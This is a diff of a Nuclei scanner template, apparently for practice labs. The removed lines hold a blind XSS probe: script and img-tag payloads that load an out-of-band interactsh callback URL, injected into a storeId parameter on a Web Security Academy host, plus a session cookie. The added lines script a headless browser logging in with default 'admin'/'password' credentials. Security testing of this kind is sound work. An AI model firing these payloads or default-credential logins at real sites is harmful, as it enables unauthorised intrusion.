@@ -1,37 +1,44 @@
-id: BlindXSS
+id: XSS
 
 info:
-  name: BlindXSS
+  name: XSS
   author: katsuro
   severity: unknown
-  tags: blindxss
+  tags: xss
 
-http:
-  - raw:
-      - |
-        GET /product?productId=1&storeId={{payloadStr}} HTTP/2
-        Host: 0a31004d04a7ee16833e928c007b009a.web-security-academy.net
-        Cookie: session=0LIUXC6ThAthXx6QVLAsfqVairJrTnkI
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
-        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
-        Accept-Language: en-US,en;q=0.5
-        Accept-Encoding: gzip, deflate, br
-        Upgrade-Insecure-Requests: 1
-        Sec-Fetch-Dest: document
-        Sec-Fetch-Mode: navigate
-        Sec-Fetch-Site: cross-site
-        Te: trailers
-
-    payloads:
-      payloadStr:
-        - '"></select><img src="{{interactsh-url}}">'
-        - '<script src="{{interactsh-url}}"></script>'
-        - '"><script src="{{interactsh-url}}"></script>'
-
-    stop-at-first-match: true
-
+headless:
+  - steps:
+      - args:
+          url: "{{BaseURL}}/login.php"
+        action: navigate
+      - action: waitload
+      - args:
+          by: xpath
+          xpath: /html/body/div/div[2]/form/fieldset/input
+        action: click
+      - action: waitload
+      - args:
+          by: xpath
+          value: admin
+          xpath: /html/body/div/div[2]/form/fieldset/input
+        action: text
+      - args:
+          by: xpath
+          xpath: /html/body/div/div[2]/form/fieldset/input[2]
+        action: click
+      - action: waitload
+      - args:
+          by: xpath
+          value: password
+          xpath: /html/body/div/div[2]/form/fieldset/input[2]
+        action: text
+      - args:
+          by: xpath
+          xpath: /html/body/div/div[2]/form/fieldset/p/input
+        action: click
+      - action: waitload
     matchers:
-      - type: word
-        part: interactsh_protocol
+      - part: resp
+        type: word
         words:
-          - "dns"
+          - "You have logged in as"
